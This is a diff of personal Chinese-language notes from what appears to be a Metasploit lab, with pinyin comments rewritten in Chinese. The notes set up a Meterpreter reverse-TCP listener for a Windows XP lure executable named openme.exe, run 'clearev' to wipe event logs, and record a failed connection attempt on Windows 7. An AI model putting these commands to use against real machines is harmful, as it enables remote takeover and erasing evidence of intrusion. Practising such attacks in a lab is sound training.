@@ -21,8 +21,8 @@ chmod 777 openme.exe 可能是多余的
 
 打开监听
 use exploit/multi/handler 
-set payload windows/meterpreter/reverse_tcp     xpshi x86de32weide
-set lhost 192.168.55.201                 kali ipdizhi
+set payload windows/meterpreter/reverse_tcp     xp是   x86 32位的
+set lhost 192.168.55.201                 kali  ip 地址
 set lport 50000                          
 run
 
@@ -32,5 +32,5 @@ meterpreter > clearev    清除日志
 
 有机会试试win7 64位  貌似要提权
 
-cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso 2011-05-12  win7da kai lianjieshibai
-huan 2010nian yiqiande win7 64wei
+cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso 2011-05-12  win7打开连接失败
+明天换2010年前的windows 试试
